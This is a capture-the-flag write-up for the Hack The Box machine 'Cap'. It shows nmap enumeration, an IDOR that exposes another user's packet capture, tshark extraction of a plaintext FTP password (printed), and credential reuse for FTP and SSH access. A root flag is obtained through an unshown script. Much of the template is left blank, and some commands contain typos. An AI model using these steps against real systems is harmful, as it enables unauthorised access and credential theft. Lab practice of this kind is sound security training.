### Hack The Box Writeup: Cap

## Overview

- **Machine Name**: Cap
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: 
- **Date Solved**: May 2025

Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. 

## Tools Used

- **Enumeration**: Nmap
- **Exploitation**: 
- **Privilege Escalation**: 
- **Other**: 

## Methodology

### Initial Enumeration

```bash
# Ping machine
ping -c 1 10.10.10.245

# Nmap port scanning
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.10.245 -oG allPorts
nmap -sCV -p21,22,80 10.10.10.245 -oN targeted

whatweb http://10.10.10.245
nmap --script http-enum -p80 10.10.10.245

tshark -1 1.pcap -Tfields -e tcp.parload 2>/dev/null | xxd -ps -r # To reverse hexa

http://10.10.10.245/data/0 # idoor
tshark -r 0.pcap -Tfields -e tcp.payload | xxd -ps -r | grep "PASS"

# ans
PASS Buck3tH4TF0RM3!

# We can log in in FTP


```

### Exploitation

```bash
# FTP
ftp nathan@10.10.10.245
# pass Buck3tH4TF0RM3!

# In ftp
ls -l
get user.txt

# We can use the same credentials to log in SSH
ssh nathan@10.10.10.245
# pass Buck3tH4TF0RM3!



```

### Privilege Escalation

```bash
# Example: Checking for SUID binaries
cat root.py
which python3

python3 root.py

cd /root
cat root.txt
# 25283e53d52827861551248084297141

```

## Challenges Faced


- **Challenge 1**: 
  - **Solution**: 
- **Challenge 2**: 
  - **Solution**: 
## Lessons Learned


## References


---

*Written by edibauer, \[05 2025\]. Feedback welcome at .*